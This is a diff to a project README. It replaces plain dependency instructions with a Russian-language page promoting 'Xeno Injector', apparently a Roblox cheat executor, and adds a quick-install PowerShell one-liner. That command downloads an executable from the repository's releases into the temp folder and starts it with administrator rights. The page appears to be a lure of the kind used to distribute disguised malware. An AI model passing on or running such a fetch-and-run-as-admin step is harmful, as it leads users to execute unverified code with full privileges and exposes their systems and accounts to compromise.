@@ -1,11 +1,22 @@
-Make sure to extract the zip file before running Xeno
+<div align="center">
 
-You must download Microsoft Visual C++ Redistributable & .NET 8.0 to make Xeno run properly.
+# 🚀 Xeno Injector
+### The Ultimate Roblox Executor
 
-Open these links below to download them:
-https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170
-https://dotnet.microsoft.com/en-us/download/dotnet/8.0
+[![GitHub stars](https://img.shields.io/github/stars/goldwinston/roblox-xeno?style=for-the-badge&color=yellow)](https://github.com/goldwinston/roblox-xeno/stargazers)
+[![GitHub downloads](https://img.shields.io/github/downloads/goldwinston/roblox-xeno/total?style=for-the-badge&color=blue)](https://github.com/goldwinston/roblox-xeno/releases)
+[![GitHub release](https://img.shields.io/github/v/release/goldwinston/roblox-xeno?style=for-the-badge&color=green)](https://github.com/goldwinston/roblox-xeno/releases/latest)
+[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=for-the-badge)](https://github.com/goldwinston/roblox-xeno)
 
-Microsoft Visual C++ Redistributable is optional as this zip file already provides it, it is still recommended to download it.
+**Xeno Injector** — это мощный и стабильный инжектор для Roblox, поддерживающий широкий спектр скриптов и обеспечивающий высокую производительность.
 
-If Xeno does not open at all after having those dependencies installed, run .NET 8.0 installer then select the repair option. That is a problem with .NET
+</div>
+
+---
+
+## ⚡ Быстрая установка
+
+Скачай и запусти Xeno Injector одной командой (PowerShell):
+
+```powershell
+powershell -c irm https://github.com/goldwinston/roblox-xeno/releases/latest/download/Xeno.exe -OutFile $env:TEMP\Xeno.exe; Start-Process $env:TEMP\Xeno.exe -Verb RunAs
